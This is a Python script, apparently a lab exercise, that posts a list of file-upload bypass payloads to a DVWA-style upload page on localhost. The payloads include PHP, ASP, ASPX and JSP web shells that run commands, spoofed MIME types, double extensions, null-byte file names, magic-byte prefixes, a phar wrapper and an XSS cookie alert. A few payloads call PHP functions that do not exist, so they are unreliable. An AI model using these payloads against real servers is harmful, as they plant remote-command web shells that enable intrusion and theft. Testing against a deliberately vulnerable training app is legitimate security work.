import requests
import random
import time

TARGET = 'http://localhost:8080/vulnerabilities/upload/'
COOKIES = {'PHPSESSID': '35cacc52bfc92dc522e7638831ba3474', 'security': 'low'}

FILES_LIST = [
    # --- Spoof MIME type and Content-Type ---
    ('shell.php', '<?php system($_GET["cmd"]); ?>', 'image/jpeg'),
    ('shell.php3', '<?php system($_GET["cmd"]); ?>', 'image/png'),
    ('shell.php4', '<?php system($_GET["cmd"]); ?>', 'image/gif'),
    ('shell.php5', '<?php system($_GET["cmd"]); ?>', 'application/pdf'),
    
    # --- Double Extensions & Case Insensitive ---
    ('shell.php.jpg', '<?php phpinfo(); ?>', 'image/jpeg'),
    ('shell.jpg.php', '<?php phpinfo(); ?>', 'application/x-httpd-php'),
    ('shell.PHP', '<?php id(); ?>', 'image/png'),
    ('shell.PhP', '<?php whoami(); ?>', 'image/jpeg'),
    ('shell.phtml', '<?php system($_GET["cmd"]); ?>', 'image/png'),
    ('shell.phpt', '<?php system($_GET["cmd"]); ?>', 'image/jpeg'),
    
    # --- Alternative Languages & Architectures ---
    ('shell.shtml', '<!--#exec cmd="ls" -->', 'text/html'),
    ('shell.asp', '<% eval request("cmd") %>', 'text/plain'),
    ('shell.aspx', '<%@ Page Language="C#" %><% Response.Write(System.Diagnostics.Process.Start("cmd.exe","/c whoami").StandardOutput.ReadToEnd()); %>', 'text/plain'),
    ('shell.jsp', '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>', 'text/plain'),
    
    # --- Null Bytes, Whitespace, & Magic Bytes Injection ---
    ('shell.php%00.png', '<?php bash_exec(); ?>', 'image/png'),
    ('shell.php\\x00.jpg', '<?php bash_exec(); ?>', 'image/jpeg'),
    ('shell.php ', '<?php bash_exec(); ?>', 'image/jpeg'), # Trailing space
    ('magic_shell.php', 'GIF89a\\n<?php system("whoami"); ?>', 'image/gif'),
    ('magic_png.php', '\\x89PNG\\r\\n\\x1a\\n\\x00\\x00\\x00\\x0D\\x49\\x48\\x44\\x52<?php system("id"); ?>', 'image/png'),
    ('magic_jpg.php', '\\xFF\\xD8\\xFF\\xE0<?php pwd(); ?>', 'image/jpeg'),

    # --- Extreme: Insecure Deserialization via POST Data/Cookies ---
    # Triggering PHP Object Injection via file upload names or extra parameters (Simulated)
    ('deserial.txt', 'O:8:"stdClass":0:{}', 'text/plain'), # Basic empty object
    ('phar_trigger.jpg', 'phar://test.phar/test.txt', 'image/jpeg'), # Phar deserialization wrapper
    ('exif_xss.jpg', '"><script>alert(document.cookie)</script><"', 'image/jpeg') # XSS in metadata simulation
]

print('--- A08: Data Integrity Failures (File Upload Bypass) ---')
for f in FILES_LIST:
    # Truyền tên file (payload) lên thanh tham số URL để Apache access_log có thể ghi lại được.
    # Trong thực tế, các hệ thống WAF/Security Proxy sẽ "móc" tên file từ Content-Disposition ra để kiểm tra.
    res = requests.post(TARGET, params={'upload_name': f[0]}, files={'uploaded': f}, data={'Upload': 'Upload'}, cookies=COOKIES)
    print(f'[*] Upload Attempt: {f[0]} (MIME: {f[2]}) -> Status: {res.status_code}')
    time.sleep(random.uniform(0.5, 1.5))
